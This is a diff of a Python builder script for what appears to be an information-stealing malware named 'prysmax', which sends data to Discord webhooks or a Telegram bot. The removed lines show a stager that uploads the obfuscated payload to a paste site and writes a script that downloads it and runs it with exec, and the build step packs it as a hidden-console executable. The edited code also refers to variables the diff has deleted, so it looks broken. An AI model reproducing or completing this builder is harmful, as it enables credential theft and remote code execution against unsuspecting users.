@@ -137,44 +137,10 @@ def compile_and_explore(webhook_url, bot_token=None, chat_id=None):
     obfuscated_file_path = os.path.join("prysmax1builder", "Obfuscated_main.py")
     subprocess.run(['python', obf_file_path, file_path, '-o', obfuscated_file_path])
 
-    with open(obfuscated_file_path, 'r', encoding='utf-8') as obf_file:
-        obfuscated_content = obf_file.read()
 
-    pastebin_link = get_rentry_link(obfuscated_content)
-    raw_link = f"{pastebin_link}/raw"
-
-    final_script = f"""
-import os, requests, shutil, uuid, wmi, psutil, subprocess, glob, re
-import platform as platform_module
-from discord_webhook import DiscordEmbed, DiscordWebhook
-from PIL import ImageGrab
-from zipfile import ZipFile
-import random
-import socket
-import threading
-import getpass
-from base64 import b64decode
-from json import loads, dumps
-from zipfile import ZipFile, ZIP_DEFLATED
-from sqlite3 import connect as sql_connect
-from urllib.request import Request, urlopen
-from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
-from Crypto.Cipher import AES
-import json
-
-iris = requests.get("{raw_link}").text
-exec(iris)
-"""
-
-    # Step 8: Write the final script
-    final_file_path = os.path.join("prysmax1builder", "prysmax.py")
-    with open(final_file_path, 'w', encoding='utf-8') as final_file:
+    with open(obfuscated_file_path, 'w', encoding='utf-8') as final_file:
         final_file.write(final_script)
 
-    # Clean up temporary files
-    os.remove(file_path)
-    os.remove(obfuscated_file_path)
-    os.remove(obf_file_path)
 
     print(f"Final script created at: {final_file_path}")
     languages = load_languages_from_file()
@@ -187,9 +153,9 @@ exec(iris)
     if here:
         print("Compiling...")
         try:
-            subprocess.run('pyarmor pack -e"--onefile --noconsole --icon=NONE" prysmax1builder\\prysmax.py', shell=True)
+            subprocess.run('pyinstaller "--onefile --noconsole --icon=NONE" prysmax1builder\\prysmax.py', shell=True)
         except:
-            subprocess.run('pyarmor-7 pack -e"--onefile --noconsole --icon=NONE" prysmax1builder\\prysmax.py', shell=True)
+            subprocess.run('pyinstaller "--onefile --noconsole --icon=NONE" prysmax1builder\\prysmax.py', shell=True)
 
         print("File successfully compiled!")
         subprocess.run("explorer prysmax1builder\\dist", shell=True)
